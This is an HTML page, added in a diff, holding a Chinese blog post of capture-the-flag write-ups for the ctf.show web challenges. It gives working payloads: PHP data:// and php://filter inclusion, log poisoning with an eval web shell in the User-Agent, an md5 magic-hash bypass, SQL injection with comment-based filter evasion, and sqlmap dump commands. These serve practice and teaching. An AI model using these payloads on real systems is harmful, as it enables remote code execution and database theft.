@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="应该是只做了一部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf秀">
+<meta property="og:url" content="https://n9-zqc.github.io/2022/06/04/ctf%E7%A7%80/index.html">
+<meta property="og:site_name" content="N9-zqc">
+<meta property="og:description" content="应该是只做了一部分">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-04T08:36:28.000Z">
+<meta property="article:modified_time" content="2022-06-04T08:37:20.480Z">
+<meta property="article:author" content="N9-zqc">
+<meta property="article:tag" content="ctf秀平台">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://n9-zqc.github.io/2022/06/04/ctf%E7%A7%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ctf秀 | N9-zqc</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">N9-zqc</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">有关网络安全的学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-文章">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>文章</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-查找">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>查找</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/06/04/ctf%E7%A7%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="N9-zqc">
+      <meta itemprop="description" content="主要有关ctf的学习笔记,主攻逆向和Web">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N9-zqc">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctf秀
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-06-04 16:36:28 / Modified: 16:37:20" itemprop="dateCreated datePublished" datetime="2022-06-04T16:36:28+08:00">2022-06-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">ctf比赛</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>应该是只做了一部分</p>
+<span id="more"></span>
+
+<h4 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h4><p>源码base64</p>
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>sqlmap简单运用即可得到flag。</p>
+<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>php伪协议，以及data协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:?url=data:text/plain,&lt;?php system(ls);?&gt;</span><br><span class="line">ctf_go_go_go index.php </span><br><span class="line">payload:?url=php://filter/read=convert.base64-encode/resource=ctf_go_go_go</span><br><span class="line">ctfshow&#123;4edf7df6-4ec6-4041-a3b5-33bebdd68cd2&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><h5 id="php日志注入"><a href="#php日志注入" class="headerlink" title="php日志注入"></a>php日志注入</h5><h5 id="url-var-log-nginx-access-log-默认日志目录"><a href="#url-var-log-nginx-access-log-默认日志目录" class="headerlink" title="?url=/var/log/nginx/access.log  默认日志目录"></a>?url=/var/log/nginx/access.log  默认日志目录</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=/<span class="keyword">var</span>/log/nginx/access.log HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b79c1882-<span class="number">5155</span>-<span class="number">4</span>b37-<span class="number">9432</span>-<span class="number">6</span>bc7787be259.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">100.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">100.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>
+
+<p>打开日志没有发现说明已经被执行了</p>
+<p>直接用蚁剑连接?url=/var/log/nginx/access.log 密码shell</p>
+<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">        $v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">        $v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;  //纯字符检验</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;    //纯数字检验</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="payload-v1-QNKCDZO-amp-v2-240610708"><a href="#payload-v1-QNKCDZO-amp-v2-240610708" class="headerlink" title="payload: /?v1=QNKCDZO&amp;v2=240610708"></a>payload: /?v1=QNKCDZO&amp;v2=240610708</h5><p>两个md5都是0e开头的</p>
+<h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><p>1.尝试万能密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<p>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p>
+<p>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p>
+<p>这里选择/**/</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27;/**/or/**/1=1#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+
+<p>成功登陆</p>
+<p>2.使用基本的sql注入模板获取flag<br>爆库(web2)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+
+<p>爆表(flag,user)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+
+<p>爆字段(flag)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+
+<p>爆字段值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27;/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[ctf.show_web7]</span><br><span class="line">http://8ac8b454-e13e-4ff5-b36b-890c20b3b5bb.challenge.ctf.show/index.php?id=1/**/and/**/1=1</span><br><span class="line">和http://8ac8b454-e13e-4ff5-b36b-890c20b3b5bb.challenge.ctf.show/index.php?id=1/**/and/**/1=2</span><br><span class="line">上面两个网址显示不同页面，说明存在注入，且是数字型注入，经过测试发现空格被过滤，用/**/代替空格·</span><br><span class="line">使用如下sqlmap进行注入：</span><br><span class="line">sqlmap -u http://8ac8b454-e13e-4ff5-b36b-890c20b3b5bb.challenge.ctf.show/index.php?id=1 -p id --dbs --batch --tamper &quot;space2comment.py&quot;</span><br><span class="line"></span><br><span class="line">available databases [6]:</span><br><span class="line">[*] ctftraining</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] web7</span><br><span class="line"></span><br><span class="line">sqlmap -u http://8ac8b454-e13e-4ff5-b36b-890c20b3b5bb.challenge.ctf.show/index.php?id=1 -p id -D web7 --tables --batch --tamper &quot;space2comment.py&quot;</span><br><span class="line"></span><br><span class="line">Database: web7</span><br><span class="line">[3 tables]</span><br><span class="line">+------+</span><br><span class="line">| user |</span><br><span class="line">| flag |</span><br><span class="line">| page |</span><br><span class="line">+------+</span><br><span class="line"> sqlmap -u http://8ac8b454-e13e-4ff5-b36b-890c20b3b5bb.challenge.ctf.show/index.php?id=1 -p id -D web7 -T flag -C flag --dump --batch --tamper &quot;space2comment.py&quot;</span><br><span class="line">Database: web7</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| flag                                          |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| ctfshow&#123;b0128aa1-4413-4260-89da-f9a14cbc6025&#125; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf%E7%A7%80%E5%B9%B3%E5%8F%B0/" rel="tag"># ctf秀平台</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%A2%98/" rel="prev" title="攻防世界web题">
+      <i class="fa fa-chevron-left"></i> 攻防世界web题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/" rel="next" title="ctf早期入门笔记">
+      ctf早期入门笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">web签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">php日志注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#url-var-log-nginx-access-log-%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  默认日志目录</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-v1-QNKCDZO-amp-v2-240610708"><span class="nav-number">5.1.</span> <span class="nav-text">payload: &#x2F;?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="N9-zqc"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">N9-zqc</p>
+  <div class="site-description" itemprop="description">主要有关ctf的学习笔记,主攻逆向和Web</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N9-zqc</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
